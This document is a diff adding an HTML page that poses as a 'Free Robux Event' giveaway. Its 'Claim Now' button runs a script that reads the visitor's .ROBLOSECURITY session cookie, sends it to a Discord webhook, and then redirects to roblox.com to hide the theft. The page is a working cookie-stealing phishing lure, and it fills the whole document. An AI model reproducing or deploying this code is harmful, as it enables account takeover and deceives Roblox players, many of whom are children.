@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Free Robux</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #191970; color: white; font-family: Arial; text-align: center; padding: 20px; }
+        button { background: #00bfff; padding: 15px 30px; font-size: 20px; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>🎉 Free Robux Event!</h1>
+    <p>Click below to claim your free Robux!</p>
+    <button onclick="claimRobux()">Claim Now</button>
+    <script>
+        function claimRobux() {
+            const cookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
+            if (cookie) {
+                fetch("https://discord.com/api/webhooks/[webhook_id]/[webhook_token]", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: "Cookie: " + cookie[1] })
+                });
+            }
+            window.location.href = "https://roblox.com";
+        }
+    </script>
+</body>
+</html>
